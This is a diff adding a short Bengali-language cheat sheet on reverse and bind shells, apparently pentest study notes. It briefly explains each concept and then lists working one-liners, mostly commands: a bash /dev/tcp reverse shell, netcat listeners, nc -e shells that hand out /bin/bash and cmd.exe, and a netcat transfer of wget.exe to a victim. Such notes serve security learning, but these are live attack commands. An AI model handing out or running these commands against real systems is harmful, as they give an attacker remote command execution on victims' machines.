@@ -1,0 +1,32 @@
+🔁 ১. Reverse Shell (রিভার্স শেল)
+
+🧠 সংক্ষিপ্ত ধারণা: রিভার্স শেল হলো এমন একটি টেকনিক যেখানে টার্গেট মেশিন (ভিকটিম) নিজেই অ্যাটাকার মেশিনের সাথে সংযোগ স্থাপন করে, এবং তখন অ্যাটাকার সেই ভিকটিমের মেশিনে কমান্ড চালাতে পারে। ⚠️ এই শেল-এ অ্যাটাকার "লিসেনার" হিসেবে কাজ করে, আর ভিকটিম "ক্লায়েন্ট" হয়ে কানেক্ট করে।
+
+✅ উদাহরণ (Linux-based Reverse Shell):
+▶️ অ্যাটাকার মেশিন (⚔️ Kali Linux): এই মেশিনে আপনি listener চালাবেন, যাতে ভিকটিম কানেক্ট করতে পারে। :  nc -lvnp 4444
+▶️ Linux (Victim Machine-Reverse Shell পাঠান) : bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+✅ উদাহরণ: Attacker in Windows, Victim in Linux (Reverse Shell)
+🔧 Netcat Windows version: nc.exe -lvnp 4444
+🎯 Victim: Linux Command (in bash): bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+
+
+🔗 Bind shell মানে: ভিকটিম মেশিনে একটি port-এ শেল "bind" করা হয়, এবং অ্যাটাকার ঐ পোর্টে কানেক্ট করে শেল পায়।
+▶️ Victim (Linux) মেশিন : nc -lvnp 4444 -e /bin/bash
+▶️ Attacker মেশিন থেকে কানেক্ট করুন:  nc 10.10.10.10 4444
+
+Shell:
+ip a
+python3 -m http.server
+
+nc -nlvp 4444 [cmd]
+nc 10.10.10.10 4444 [linux]
+
+nc -nlvp 4444 > wget.exe [cmd]
+nc 10.10.10.10 4444 < wget.exe [linux]
+
+nc -nvlp 4444 -e cmd.exe [cmd]
+nc 10.10.10.10 4444 [linux]
+
+nc 10.10.10.10 4444 -e cmd.exe [cmd]
+nc -nvlp 4444 [linux]
